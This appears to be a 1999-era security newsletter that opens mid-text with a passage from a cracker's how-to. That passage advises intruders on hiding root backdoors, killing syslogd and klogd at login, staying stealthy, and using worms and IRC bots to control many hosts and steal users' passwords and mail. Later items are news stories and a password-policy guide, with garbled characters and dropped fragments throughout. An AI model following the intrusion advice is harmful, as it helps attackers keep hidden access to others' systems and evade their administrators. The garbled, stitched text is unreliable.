          The alternative to all this for lazy people is, to add a
          ipfwadm rule that prevents traffic from the outside (-W eth0)
          to the ports with the buggy daemons, and adding that command
          to a rc.d script as well. Bind doesn't need tcp port 53 for anything
          except zone transfers and the RoTShB/ADM bind exploits. It works
          fine with 53/tcp firewalled. But be aware that this might get you
          detected, lets say if you disable port 110 or 143 on an ISP's
          central mail exchange server...
      
      About your backdoor:
          Port > 10000 is strongly recommended, also a backdoor using UDP,
          ICMP, or even something as unusual as raw IP is very useful.
          People that bind /bin/sh to a port are idiots, because they
          open that host to everyone, letting in sniffers, and probably
          other people who may damage the host seriously. Make sure to
          password protect everything that runs as root. A password
          of a minimum length of 8 characters, because you have no way
          of detecting a brute force attack. For the C programmers, let
          me say, listen(sockfd,1). Maybe 2 connections, but not more.
          For comfortability, you can add some stuff you want to occur
          on each successful backdoor login, like system("w"),
          system("killall -9 syslogd klogd"), or whatever. If you want a
          front-end backdoor with some integrated functions, try gateway[5].
      
      IV. UTILIZING COMPROMISED SYSTEMS
      
      About your activities:
          Do what you desire, but never without disregarding stealthiness.
          If you stop checking log files, processes, or start something
          like ping -s 1024 -f cert.org un-stealthed, it is, depending
          on the admin, a matter of hours or days until you lose the host.
          Most of the time, losing a host means you cannot get access again,
          and the admins will examine their system with extreme scrutiny;
          if they are too lame, they might contact some external security
          experts or even the Computer Emergency Response Team.
          Never do serious damage to the system, when you don't have to -
          and trust me, you won't. Damaging a system by altering vital system
          files, replacing frequently-used programs or even destroying
          information is unintelligent, will not do you any good, and will
          maybe assist you in getting new enemies.
          And it is trivial to mention not to deface web sites...
      
      World domination:
          As the number of systems you control increases, you might want
          some kind of easy remote control, utilization for attacks,
          and detection of detection of your activities. You can install
          newnick bots or eggdrop bots with fancy scripts which can be
          controlled through IRC to make life easier (make sure to sit and
          think before you consider doing anything big with them on IRC!).
          You can make your own inter-linked network of root systems,
          in which case you need to start programming because no one will
          release such a program to the public. :)
          You can make a little packages with spoofing flooders, smurf
          and the like, if you decide becoming a packet warrior (then again,
          it won't help you accomplishing anything but getting irc channels
          or shutting down government sites...).
          Alternatively, you can use every root you get to scan new netblocks,
          and have the information mailed to you or whatever. You can make
          an internet worm like ADMw0rm [4], B4b0w0rm, millennium worm
          (the last 2 are private), and install them on your roots; make sure
          it is well constructed and bug-free...
          If you are a creative person, you can make them scan large amounts
          of ISP dialup netblocks for back orifice, netbus server, backdoor G,
          and what not, and write something that controls their computers
          to spread more trojans, send their mail to you, get their
          passwords, flood, scan, invade their private lives...
          no wait, that's the governments job.
      
      V. YOUR PRESENCE ON THE NET
      
      Smart behavior and senseless behavior:
          What you do besides cracking, mostly happens on IRC. IRC
          should be seen as a tool for getting in touch with other
          skilled persons and exchanging thoughts and information.
          To avoid wasting your time, skills, and possibly getting
          busted, here are some things which you SERIOUSLY should
          not be doing:
          1) Warez. Stay away from warez, it is a waste of time.
           Warez ruins productive people and makes software expensive.
           Besides the moral bullshit, you can always get something
           you really need (#1 net game, enterprise application etc.),
           and you don't need much, trust me. Almost everything
           security / hacking related is free. Joining a warez group
           gets you a) alot of vhosts with lame names b) idiotic
           friends c) on the FBI blacklist - nothing besides that.
          2) 'IRC War'. Groups like core, chrome, enforce, conflict,
           takeover, madcrew, phorce, tnt, etc. etc. who call themselves
           'War' groups, are good for nothing. Why would you want to
           be a member of a group that attacks other similar groups
           and channels - it is comparable to the mafia - almost

           happened to gH or 'global Hell'. Most of these groups
           do the exact opposite of what is advised in this paper.
           If you get an offer to join:
           l0pht, cDc, MOD, thc, or ADM, take it because you'll
           learn a lot, all other groups are not worth your time.
          4) IRC operators, BOFH, admin of big systems. Stay away
           from them until you are confidently prepared and willing
           to fight with them. Blindly attacking them can also be a waste
           of time, but it can also become a reasonable challenge.
      
      Keep up to date:
          The more you advance in cracking skills, or even might
          consider hacking, programming or developing, the web
          probably gets the part of the web you use least.
          Visit your favorite security related sites frequently,

      The Department of Defense unveiled the newest
      high-tech crime laboratory last Friday. Technology
      within the lab supposedly has the ability to "trace
      hackers across the Internet", break encryption and
      rebuild cut up floppy diskettes. The new Defense
      Computer Forensics Lab located near Baltimore MD,
      (very close to NSA Headquarters) will be staffed by a

      murder and other crimes, as well as training other
      investigators.

      High-tech crime-fight Lab unveiled
 
      BY TED BRIDIS
      Associated Press Writer 
 
      LINTHICUM, Md. (AP) -- The Defense Department showed off its latest arsenal of
      high-tech crime-fighting tools Friday, a $15 million computer lab where it can trace
      hackers across the Internet, unscramble hidden files and rebuild smashed floppy disks
      that were cut in pieces.
 
      Investigators will use the new Defense Computer Forensics Lab, located in a nondescript
      brick building south of Baltimore, to unravel electronic evidence in cases of espionage,
      murder and other crimes involving America's military.
 
      Using powerful computers and special software, these 80 digital detectives can trace a
      hacker across the Internet to his keyboard, recover files thought to be safely deleted and
      quickly search tens of thousands of documents for an important phrase.
 
      Cyberspace is ``a new kind of wild, lawless sort of frontier,'' said Christopher Mellon, a
      deputy assistant Defense secretary. ``We have important national interests, and we have
      to be able to function.''
 
      Organizers envision sharing equipment and secret techniques they develop to help FBI, state and local authorities prosecute
      criminals who use computers, such as drug-dealers who track profits and customers with accounting software.
 
      The FBI even established its own minilab upstairs in the building, though most of its digital forensics work will continue to be
      performed in downtown Washington at its headquarters.
 
      ``Virtually every white-collar crime case today brings at least one computer, if not a whole network of computers,'' FBI Assistant
      Director Donald Kerr said. ``We need people who are well prepared.''
 
      David Ferguson, the lab's director, showed how experts can use these high-tech tools to enhance garbled audio recordings -- even
      digitally mute one voice in a conversation to listen to another -- and recover computer files from disks and tapes even if they had
      been deleted.
 
      The lab can dissect virtually any type of computer, from handheld devices to Apple computers to those using Windows or even
      specialized software. It's developing a way to analyze all machines using a powerful assembly of computers working together,
      called a ``Beowulf cluster,'' technology also used by NASA and some Energy Department researchers.
 
      One lab worker, David Lang, demonstrated how investigators can reassemble and read from a computer's floppy disk that a
      criminal trying to hide evidence might cut into pieces and crumple.
 
      The procedure, developed a decade ago but still being perfected, takes ``a day if you're lucky, to a month if it's something you
      haven't encountered before,'' Lang said. ``It's basically just a jigsaw puzzle to be put back together.''
 
      Ferguson expects to handle about 400 cases each year from all the military branches, mostly crimes where a computer might have
      played part in espionage, deaths or sexual assaults. About 10 percent of cases involve tracing hackers snooping through military
      computers.
 
      The new program also trains investigators, who will be assigned full time to military posts and bases worldwide. Typical classes are
      three weeks of about a dozen students learning about espionage, hackers, networks and special computer hardware.
 
      ``What we intend to handle here is the big and large,'' Ferguson said, citing examples where huge amounts of data need to be
      analyzed or where a particularly savvy criminal scrambled his digital records and won't give up his password.
 
      Although Ferguson and others declined to discuss specific cases already under way, they described as rare those involving
      encrypted files.
 
      The White House agreed last week to allow sale of the most powerful data-scrambling technology with virtually no restrictions,
      although military and law enforcement officials have long warned that criminals and terrorists might also use the technology.
 
      Ferguson said he was confident that techniques to break those messages will be adequate once Congress approves a proposal by
      the Clinton administration to give the FBI $80 million over four years for the technology.
 
      Defense Department officials also acknowledged that the lab's proximity to the nearby National Security Agency, the government's
      premier code-breaking organization, was a primary factor in deciding its location.

      IBM Looks to Lock Down PC
      Security 
 
      Big Blue hopes its security chip will become a
      standard. 
 
      by Reuters 
      September 27, 1999, 8:23 a.m. PT 
 
      IBM plans to launch on Tuesday a security system that
      it hopes will set the industry standard for protecting
      confidential documents, such as those used in the
      growing area of electronic commerce.
 
      Unlike previous security measures that rely on software
      "firewalls" that filter out unauthorized users of
      information, IBM has developed a security chip
      embedded within the computer hardware, which, it
      says, adds additional levels of security.
 
      "People from outside [of your organization] can get at
      your software," says Anne Gardner, general manager of
      desktop systems for IBM. "People from the outside
      can't get to your hardware."
 
      The first IBM computer to include the security chip will
      be the PC 300PL. The company plans to eventually
      include the security features in all of its products.
 
      The chip will come installed in the hardware with no
      additional cost to the customer, Gardner says.
 
      The features of the security chip include key
      encryption, which encodes text messages, and "digital
      signatures," which act as unique "watermarks" that
      identify the sender of the document.
 
      Share and Share Alike
 
      "We want this to become an industry standard," IBM's
      Gardner says. "We want this on as many desktops as
      possible."
 
      Asked if IBM would share the technology with
      competing hardware makers, she says, "You may see
      something along those lines in the future." She
      declines to be more specific.
 
      "It's a good strategy not to try to clutch this technology
      and try to make money," says Roger Kay, an analyst
      at International Data Corporation. "It's a good strategy
      to give it away and try to get as many people to go for
      it as possible. IBM doesn't want this to be proprietary.
      They want it to be ubiquitous."
 
      Kay calls the development "a good first step" toward
      making people more comfortable doing business over
      the Internet.
 
      "Over the next two years you're going to see an
      increased focus on security as more people do
      business over the Web," says Joseph Ferlazzo, vice
      president of syndicated services for Technology
      Business Research.
 
      "It's essential to have a verifiable digital signature that
      will allow companies to engage in business
      transactions," he adds. "What IBM is trying to do is
      make this an essential part of computer configurations
      going forward so that the capability will already be
      inside the computer."

      -- Richard Monteilh, former D.C. economic development official, on losing
      MCI WorldCom Inc. operations to Loudoun County.

      Tracking a Hacking

      Plenty of lawyers have been called hacks, but lawyers at Steptoe & Johnson
      are among the first to be called hackers.

      Seeking more than $800,000 in damages, Moore Publishing of Pennsylvania
      sued the blue-chip Washington firm for allegedly trying to sneak into one of
      the company's Internet domains. The lawsuit, filed last week, alleges that
      someone at Steptoe -- they're not sure who -- tried to hack into the site eight
      times in August.

      "The attempt did not display the mark of genius," said Rodney Sweetland, the
      Arlington solo practitioner suing on Moore's behalf. "Whoever did this knew
      something about hacking, but not enough to cover their tracks."

      Steptoe officials say the suit is completely baseless and that they'll fight it
      vigorously. The firm has already rebuffed an overture to settle the matter out
      of court.

      Sweetland claims that computer logs will prove his case, but he offered only
      a sketchy explanation of Steptoe's possible motives. Moore's primary
      business is digging up electronic data for companies conducting asset
      searches, but it has a sideline as a cyber-squatter. It has purchased the rights
      to the Internet domain names of a handful of law firms, apparently hoping to
      resell those rights at a later date. Among the names it owns:
      Steptoejohnson.com.

      Still, it's unclear why any Steptoe employee would care. The firm already
      has a Web site at steptoe.com.

      DOE sets security course

      Department will allot $80 million to bolstering data controls

      By Frank Tiboni
      GCN Staff

      The Energy Department will spend $80 million over the next two years to create a
      security net for its systems, chief information officer John Gilligan said of the
      cybersecurity plan he will roll out departmentwide next month.

      The four-point plan calls for sweeping changes in how the department protects its data
      re-sources, Gilligan said. He said the planÆs four areas address policy, personnel,
      operational and technical requirements. He submitted the plan to Energy senior
      management late last month and got the green light to begin work immediately.

      To make sure that new security initiatives take hold beyond department headquarters, Gilligan has asked field
      sites to designate CIOs or equivalent officials as lead security officers.

      The obvious first step is awareness, Gilligan said, so a major component of the plan is training and education.
      The department will begin a two-year, $2 million multimedia program right away, he said.

      Secretary Bill Richardson initiated several security re-forms in the wake of the Los Alamos espionage scandal,
      including giving computer security oversight to Gilligan [GCN, May 24, Page 1].

      A central component of RichardsonÆs reform package directs Gilligan to improve the security of information that
      is stored, processed or transmitted by Energy systems.

      The reforms also realigned the CIOÆs office under the new Office of Security and Emergency Operations, which is
      headed by former Air Force Gen. Eugene E. Habiger [GCN, June 28, Page 1].

      The 47-page systems security planùwhich GilliganÆs staff had been working on since mid-May with help from
      Booz, Allen & Hamilton Inc. of McLean, Va., Electronic Data Systems Corp. and Mitre Corp. of Bedford,
      Mass.ùdetails ongoing and planned activities. Gilligan said the department will use it as a cybersecurity road
      map for the next five years.

      ôItÆs a sound plan thatÆs comprehensive, addresses needs and is doable,ö he said. ôIt will clearly allow us to
      achieve a significant improvement in computer security in the next two years.ö

      Gilligan said he will coordinate the execution of the plan through the departmentÆs Field Management Council.

      During Phase 1, which takes place from October through December, more than 1,000 systems administrators
      and managers at the departmentÆs national laboratories will undergo training in network security, system-specific
      configuration planning, Web server security, mail server security and cybersecurity policies for managers.

      Following up on that initial training, Energy will broaden its program to ensure that appropriate training is given to
      all DOE personnel and contractors within the next two years. The training will cover the security requirements for
      all systemsùthose that handle classified information as well as those that handle unclassified data.

      Gilligan said another effort will be to improve security operations in the department. Energy will spend $45 million
      of the $80 million it is setting aside for systems security through fiscal 2001 on bolstering program management,
      monitoring ability and protection know-how.

      As part of this effort, Energy will expand the staff of its Computer Incident Advisory Capability at the Lawrence
      Livermore National Laboratory in Livermore, Calif., from seven to 25 people over the next year.

      CIAC will be EnergyÆs first line of defense. It will spearhead intrusion assessment, warning and response, and
      the day-to-day monitoring of department systems and networks, Gilligan said.

      By Patricia Daukantas
      GCN Staff

      The Army will investigate biometric recognition devices as a way to reduce or eliminate password use for
      accessing computer and weapons systems.

      Commercial biometrics can be leveraged for military systems, said Phillip Loranger, a division chief at the Army
      Information System Security Office in the Directorate of Information Systems for Command, Control,
      Communications and Computers.

      The Army wants soldiers to have unique identifiers that cannot be stolen or forgotten. ôWe need to dump the way
      we do passwords,ö Loranger said this month at a meeting of the Biometric Consortium in Arlington, Va.

      The service approved the study early this month and is kicking it off with fiscal 1999 year-end funds. Loranger
      declined to put a price on the effort, which he will lead. He said the study, slated for completion by spring, will
      consider the legal and sociological implications and the feasibility of large-scale biometric recognition for Army
      systems.

      Iris recognition, in which an imaging system scans the pattern of an eyeÆs iris, will be the first technology
      studied. It has an edge over fingerprint and voice recognition, Loranger said, because it works even when
      someone is wearing protective headgear.

      ôVoice doesnÆt work through a gas mask,ö Loranger said. ôFingerprints canÆt be taken through rubber gloves.ö He
      said recent innovations allow iris recognition through plastic face shields and eyeglasses.

      The system uses a small imaging device, not unlike a digital camera, that plugs into a PC and compares a
      userÆs iris image against stored patterns of known users.

      The study will also examine fingerprint and voice recognition. Loranger said the Army already collects soldiersÆ
      fingerprints. The recognition tools for desktop PCs cost $100 to $2,000, he said, and can be built into keyboards,
      mice and notebook computers.

      Voice recognition systems can work either at desktop systems or over dial-up lines, re-quiring only a
      microphone and a sound card.

      The study will examine setting up an Army or Defense Department center for biometric technology. ôYou couldnÆt
      find a better test bed anywhereö than the Army, Loranger said, because its computers run at least 17 operating
      systems, including legacy OSes.

      Too hard

      He acknowledged that some systems still will require passwords, at least with todayÆs technology. But asking
      soldiers to remember multiple eight-digit, randomly generated pass codes is ôhard security,ö Loranger said. ôThe
      easier you make reliable security, the better that security will be.ö

      He said he is more interested in integrating off-the-shelf technology into military systems than in conducting an
      extensive development effort from scratch.

      Loranger said he envisions a time when biometric recognition will even be integrated into the handgrips of guns to
      prevent unauthorized use. ôAll it takes is time and money,ö he said.

      Media Player and privacy

                        BY MARK D. FEFER 
 
                        ONE PLACE WHERE RealNetworks and Microsoft are unlikely to compete is on the issue of privacy. 
 
                        There has been a flurry of controversy lately over uniquely identifying numbers embedded in Intel's new
                        Pentium III chip and Microsoft's Windows 98 operating system. To quell the outrage, Intel has
                        introduced software that will allow computer users to hide the chip's unique serial number, so that it
      can't be used to track users' Web behavior. And Microsoft has pledged that it will no longer collect a number known as the
      Globally Unique Identifier, or GUID, when registering Windows 98 users. 
 
      All the while, however, people who use streaming media have already been tagged with such a unique, identifying number.
      Seattle Weekly has learned that both the RealNetworks' RealPlayer and the Windows Media Player carry GUIDs, and those
      numbers are transmitted to any site where you access a streaming file. This opens up at least the possibility of a database in
      which all your streaming media use can be recorded (though there is no indication that such a database exists). 
 
      Gary Schare, Microsoft's lead product manager for Windows Media Technologies, confirms that each Media Player carries a
      GUID. But he says the company keeps no database with those numbers and does not track individual Media Player usage. 
 
      RealNetworks officials did not respond to numerous requests from Seattle Weekly to discuss the subject of GUIDs. But
      executives in the business of tracking Web usage say that the RealPlayer, too, carries an identifying code. And RealNetworks,
      unlike Microsoft, requires you to submit your name and e-mail address before allowing you to download the player. 
 
      Every time you click onto a Web page, a variety of information about you is automatically recorded in the site's "log
      files"--information such as what kind of browser you use, what page you were last visiting, how long you stayed at the site, etc. If
      you use a media player at the site, your media-streaming activities are also recorded, along with your player's ID number. 
 
      Bill Piwonka, a product manager at Portland-based WebTrends, which makes the leading software program for sorting and
      analyzing log files, says that although media player GUIDs appear in the files, WebTrends does not actually compile those ID
      numbers or present them in its reports. "WebTrends doesn't do anything with the number," he says. "We're not really sure what
      it's there for or how it's used." 
 
      On the other hand, Piwonka notes, "There's no way for us to know if Microsoft or Real have put something in there that helps
      them track." Computer programmer Richard M. Smith, the head of Phar Lap Software, who first drew attention to the Windows
      98 GUID last month, says the only way to find out would be to "put a 'packet sniffer' on, and see what's going down the wire"
      when you call up a media stream. 
 
      But Gary Schare of Microsoft insists that "the only place [the GUID] appears is in the log files. We don't ever pass that
      information around, or back to Microsoft in any way." Schare says the only contact between the player and Microsoft is through
      "our upgrade mechanism," whereby a player will "ping" the Microsoft server, and you'll be automatically "reminded" to upgrade if
      you don't have the current Player version. But even that mechanism, while in place, has not been activated, Schare says. 
 
      So why is the GUID even there? At press time, Schare said he did not know the technical justification. "I know there's a good
      reason. We don't just stick stuff like that in randomly." 
 
      Jason Catlett, who runs the privacy watchdog Junkbusters, speculates that the GUID could be useful for apprehending copyright
      violators. Just as the Windows 98 GUID is imprinted in documents created with Microsoft Office, the GUID from your player
      could be imprinted into the media file, Catlett speculates, and that could help track down the source of any unauthorized
      copying. 
 
      But Schare contends that streaming files are untouched. "It's read only. There's no tracking in a piece of content as to who's
      played this. That doesn't occur."

      Hacker Pleads Guilty To Grade-Fixing'                                       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      An 18-year-old computer hacker who boosted grades for fellow high school students in exchange for money has pleaded guilty to one count of felony computer trespass. 
      Sentencing for Adam R. Jerome was scheduled for Oct. 7 in Clark County Superior Court. Jerome's accomplice in the crime, Phillip J. Latimer, also 18, pleaded guilty Friday to a lesser charge of misdemeanor computer trespass. 
      "Mr. Latimer was essentially the marketing person for Mr. Jerome's services," deputy prosecutor Beau Harlan told Judge Barbara Johnson. 
      Latimer collected between $2 and $80 from 22 Evergreen High School students, most of them seniors, who wanted their transcripts altered. He was handed a 30-day sentence -- two days in Clark County Jail and 28 days on work crew -- and will be on probation for one year. 
      Harlan said he'll recommend a 90-day sentence for Jerome, who was on juvenile probation for burglary when he hacked into the school district's computer system. Jerome altered 31 transcripts in all, Harlen said. 
      Word of the grade-boosting surfaced in April. Jerome and Latimer were charged in June. 
      School officials estimate it will cost more than $15,000 to upgrade the security on the computer system, Harlan said. Latimer and Jerome will be ordered to pay restitution. Jerome's lawyer, Jon McMullen, said his client had no idea hacking into the school's computer system was a felony. 
      "He knew what he was doing was wrong, but it's a question of how wrong," McMullen said. "He thought he might be expelled, but not labeled a felon for the rest of his life." 
      Latimer, who has no prior criminal record, said the hacking started as a prank. "To this day I can't really say why I did it," Latimer said. "I just honestly know it was a mistake." Prosecutors decided not to charge the students who paid to have their grades changed. They were suspended from school for 10 days. 
      
      
      
      Are Eastern Europe's Banks Being Cracked?                                      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      A few weeks ago, marketing companies in the Czech Republic received an anonymous e-mail from a self-proclaimed computer security expert. The e-mail's author boasted of having just penetrated the system of the largest bank in the country.   
      The network cracker was offering to sell to the marketing firms information about Ceska Sporitelna's 2.5 million customers including where they worked, how much they made and their account numbers.   As Czech reporters struggled to unravel the case, they were hindered by contradictory revelations from the police department and the bank. Early reports, attributed to an unnamed police source, carried full details of the alleged hack, saying that the bank's systems had indeed been penetrated, and that detectives had verified the authenticity of the data.   
      But by the middle of last week, the police department was no longer answering questions, saying an information embargo had gone into effect on Sept. 15. The day before, the bank's general director had issued a statement saying that the hacks had never happened, and were merely an effort to discredit the state-run bank, which is gearing up for privatization. Then the bank, too, stopped commenting.   
      The International Chamber of Commerce, a body of companies and trade associations from 130 countries, says its anxiety about such cases is growing. As financial institutions around the world continue to bring services online, security measures become more imperative and more vulnerable than ever. According to Blue Sky Research in Paris, European Internet sites in particular are growing by large percentages. Blue Sky reported in July that the number of banking sites in Europe had grown from 863 in November 1998 to 1,845 by the following summer.   
      Pottengal Mukundan, the director of the ICCs Commercial Crime Services division, says the biggest complication is that banks don't want the world to know when a breach has occurred. "For the last couple of years we have been looking at this problem," Mukundan says. "We can't speak of examples, because this is a sensitive subject. Banks in particular don't wish these cases to be made public."   
      In response, Mukundan says the ICC is readying a special unit to tackle cybercrime. The unit will make its public debut in London at the end of the year, at the Alliance Against Cybercrime conference. The new department, he says, will allow companies to keep their worries private. The unit hopes to solve cybercrimes without exposing banks to dangerous publicity.   
      "Basically, we act as a club for our members so they can talk to us in confidence," Mukundan says. "Normally, in matters such as fraud, banks and insurance companies are very hesitant to talk to other banks. The idea in forming the [cybercrime] bureau is that they will feel a little more secure in telling us what their experiences are. We will then hold on to the information and pass it on to other [companies] without revealing the source." A similar approach, he adds, has worked in other industries like international shipping.   
      The ICC's closed-door plan holds particular appeal for banks in Eastern Europe and developing nations, according to Evan Neufeld, VP of international research at Forrester Research (FORR) in London. Competition, market regulation and law-enforcement agencies in prevent banks in the U.S., Western Europe and developed Asia from hiding security breaches. 
      
      
      
      Implementing Security Measures                                              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      So far we have talked about your risks, known exploits and bugs, and your policies or lack of them, but now we we start to get into the meat of Internet and network security. It is now time to start implementing security measures on your system.  
      We are going to start with passwords. We begin here because (a) It is a pet peeve of mine that system and network passwords are so often badly managed, (b) This is the first and most important link in your security chain, and (c) it is a very easy place to start.  
      This part of basic password policy I have gone over before but it is so basic and so important that I feel that repeating it is worth it. Make your passwords secure by following certain rules. Here are some do's and don'ts:  Don't Use the following for passwords:  
      Your first name.                                                     Your last name.                                                     Your login name.                                                      Your pet's name.                                                     Any name at all.                                                      SS number.                                                           House number.                                                     Telephone number.                                                    Your bank PIN.                                                         Any password shorter than six characters.   
      Do                                                                    Use passwords of six characters or more.                                   Use a combination of letters and numbers.                            Use a combination of letters, numbers, and special characters.   
      What makes a password secure is the amount of complexity you have in creating the password. This complexity is not just to prevent someone from guessing what the password is, but also to thwart the efforts of crackers who use special cracking software to crack a password. Password cracking programs work by using a dictionary of words to compare the passwords to. This means that any word at all can easily be discovered. Any word that can be found in a dictionary, no matter how obscure it may seem, can easily be revealed. Most password cracking program , after using the dictionary approach will then start using combinations of letters. A password that has a what seems like a random sequence of pure letters is also easily cracked. I was able to crack the password "kgjhuy" in under two minutes. The next attack a password cracking program will use is a combination of letters and numbers. I was able to crack the password "jim1952" in under 10 minutes. Similarly the password "j1i9m52" took a couple of hours to crack. The password "jim&1*9!52#" has not been cracked yet after more than 12 hours. So the most secure password is one that is more than six characters long and is a combination of letters, numbers, and special characters that are intermixed within the password.  
      So now that you have set your password policy, it is time to enforce it. Just by telling everyone that their passwords must be six characters or more and contain a mix of letters, numbers, and special characters, does not mean that they will do this. While doing a password audit once, I found that some people had no password, some used their login name as their password while others used the same letter or number six times. So how do you enforce password policy? Windows NT gives you rudimentary tools for enforcing password policy. If you open the User Manager For Domains (as administrator, of course) and go to the menu "Policies" and choose "account". You are presented with a properties page for passwords. Here you can set the password length, days until expiration, lockout retries and password history. Let me go over what each of these is for.   
      Minimum Password Length is somewhat self explanatory. You can set the value for the minimum length a password must be here. If you set it to 6, then each user in that domain must choose a password that is at least six characters long.  
      Days until expiration or Maximum password age allows you to set the length of time that will pass before a user has to change their password. In high security areas the maximum password age is set for 7 days or even as low as 1 day. For most people somewhere between 30-90 days will suffice.  
      Account lockout is so you can set the maximum number of retries a person has until that account is locked out. This prevents someone from trying to repeatedly guess a users password. Don't set this number too low. Many administrators set this at 3 but I feel that this is too low. If you mess up on the first try, you only have two more tries before your account is locked. I would set this number to 5 or 6. This gives the user some fudge room while at the same time prevents password guessing by unauthorized individuals.  
      Password history or Uniqueness prevents the user from choosing the same password over and over. Unless you assign passwords to your users, do not set this value too high. If the user must always choose a completely new password every 30 days, they will run out of password ideas. This of course, will make your job harder because the users will forget what the password was that they created thus making you have to unlock their account several times a week.  
      Unfortunately, there is no way to specify that the user must have a mix of letters, numbers, and special characters from within Windows NT. For that kind of control you must use a third party software product to do this. Products like "Password Appraiser" and "Password Policy Enforcer" let you set and enforce a strong password policy across the enterprise.  
      With Unix or Linux operating systems, the default password policy is very lax. In fact, you can set up a root account with no password at all if you wish. Of course this is different with different versions of Unix, some versions are more lax than others. You can set password policies rather easily in *nix with some simple scripts. If you are reasonably proficient in Perl, you can write a simple script that will specify password length, types of characters and password expiration without having to go out and buy a third party solution. If Perl is not your thing, I have provided a link below that has some sample scripts that you can use. Another point to note is that many Unix password files are not very securely encrypted. It would not take much effort to crack the passwords in passwd file. For this reason you might want to consider other measures to ensure strong password encryption. For Linux you can use the Password Shadow Suite. The Linux Shadow Password Suite gives you strong encryption of your passwd file that resists brute force cracking techniques.  
      Passwords are the first link in your security chain. If this link is weak, then your whole chain is broken and no combination of firewalls, proxies or other measures will keep your network secure. Focus on your passwords first and then you can add other security tools as you need them. 
      
      Activists Pull Stunt To Show Crypto Holes                                  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      The British Home Secretary has been sent a potentially incriminating e-mail by a pressure group trying to show that a draft e-commerce law could see innocent people falsely imprisoned. 
      Stand -- a group campaigning against controversial measures in the Electronic Communications Bill to govern the supply and use of encryption -- said on Monday it had sent Jack Straw an e-mail containing a confession to a crime. This had been encrypted with a key created in Straw's name and registered on international public key servers, 
      "The police may come and demand that you supply the key requiredto make this message intelligible," the letter said. "If you fail to do so, you would be committing an offense under the [Electronic Communications] Bill rendering you liable to imprisonment for up to two years. 
      "The fact that you don't possess this key won't help you unless you can prove that you don't have it. I wish you well in proving that it isn't hidden away on a disk in your secretary's home, or squirreled away on the Internet somewhere." 
      The group, supporting the view of lawyers who have spoken on the subject, argued the draft legislation would reverse the "innocent until proven guilty" principle. 
      Last week, Nicholas Bohm of the Law Society told a conference the bill would reverse the burden of proof and breach the European Convention on Human Rights that protects against self-incrimination. 
      At the same Scrambling For Safety 3.5 conference, the new e-commerce minister Patricia Hewitt defended the Bill saying its requirements were no different than the police being able to develop a roll of film found in a defendant's home when searched. 
      But Bohm argued the bill's powers were closer to the analogy of forcing the accused to develop a film themselves if it required special processing and the police could not develop it. In current law, suspects do not commit a crime if they decline to do this. He also used the analogy of a booby-trapped safe, where the contents could be destroyed if it was opened. The police could not currently force a suspect to deactivate any such privacy measures. 
      "Even if you can prove that you don't have it, you would still be liable for imprisonment unless you give information to the police that enables them to decrypt the key," the letter said. "Unfortunately for you, this is impossible, because we've destroyed all copies." 
      A Home Office spokeswoman said the department didn't believe the bill would reverse the burden of proof as the prosecution would still have to prove guilt beyond a reasonable doubt in all cases. She conceded that confusion may have arisen from putting specific defenses on the face of the Bill. Such as: "If you don't have the key, but you give as much information as possible about how it could be obtained," she said. 
      Of the letter, the spokeswoman said people could be falsely incriminated in this way today without the Bill and without encryption being involved. 
      "We think that's almost a red herring," 
      
      
      U.S., Network Solutions Reach Agreement                                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      Internet address registrar Network Solutions and the U.S. Commerce Department have finally reached an agreement to offer competitors long-term access to the company's domain name database, a source familiar with the deal said Monday. 
      Following almost a year of negotiations, Herndon, Va.-based Network Solutions has agreed to let competing companies register new Internet addresses for a fee of $6 per year, well below the $35 per year Network Solutions charges its customers. 
      The company will continue to manage the database of already registered names for at least four more years, under the agreement. 
      In essence, other companies will be able to compete for the "retail" business of registering new domain names, while Network Solutions will continue to run the "wholesale" business of keeping track of already registered names and informing Internet servers how to route traffic. 
      During an ongoing, several month "test" of competition, a handful of companies were allowed to register Internet address names into the Network Solutions database for a fee of $9 pername, per year. 
      Network Solutions has also agreed to be overseen, as its new competitors are, by the Internet Corporation for Assigned Names and Numbers (ICANN), a California nonprofit tapped last year by the Commerce Department to administer the domain name system. 
      The agreement is to be announced at a Commerce Department press conference on Tuesday. 
      Under an agreement with the government that expired last year, Network Solutions was the only company permitted to register Internet domain names, the addresses of websites, e-mail, and other Net resources, that ended with the popular .com, .net and .org suffixes. 
      But the Clinton administration decided to privatize the system, handing the reins over to ICANN last November and earlier this year, letting firms compete with Network Solutions for the first time. 
      Since then, ICANN has struggled to get off the ground, running into criticism from Internet users and members of Congress for making decisions behind closed doors and proposing to fund itself with a fee of $1 per domain name. 
      And Network Solutions battled the Commerce Department and Congress as it asserted ownership of the list of more than 5 million domain names it registered before the onset of competition. 
      On Monday, a spokesman for Network Solutions declined to comment. 
      A spokesman for the Commerce Department said Secretary William Daley would make a statement on the domain name situation at Tuesday's press conference.

      CMGI to acquire free ISP 1stUp                                             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      Internet holding company CMGI said today that it has agreed to buy free Internet service wholesaler 1stUp.com, in a move that solidifies the company's moves toward creating a full-service Web access and content powerhouse.
      San Francisco-based 1stUp is the same company that provides CMGI affiliate AltaVista with its free ad-subsidized Internet access service, launched in August. The start-up also has signed a deal to provide its free service to Bolt.com, a teen-oriented Web portal. 
      The deal comes as CMGI has been moving to more closely integrate its various Web properties in hopes of taking on established Web players like Yahoo and America Online
      
      
      
      
      
      Microsoft - ActiveX Holes                                                 ~~~~~~~~~~~~~~~~~~~~~~~~~~
      Microsoft has patched a handful of security holes in its Internet Explorer browser and ActiveX technology that made computers vulnerable to attack by malicious Web site operators.
      The first patch takes care of a problem with IE's ImportExportFavorites feature, which lets users tranfer lists of frequently visited Web addresses. The bug lets a malicious Web site operator run executable code on the computer of someone who visits that Web site.
      "The net result is that a malicious Web site operator potentially could take any action on the computer that the user would be capable of taking," Microsoft warned in a security alert earlier this month.
      Microsoft's patch eliminates the problem, the company said today. Versions 4.01 and 5.0 of IE are at risk. The patch also fixes a related problem involving ActiveX, Microsoft's technology for bringing interactive scripts and controls to Web pages.
      ActiveX has long been a security headache for Microsoft. Critics of the technology fault its "trust-based" security model, in which signatures let users choose whether to download an ActiveX control. With this system, users are expected to judge that controls signed by well-known companies like Microsoft are less likely to be maliciously designed than those signed by unknown entities.
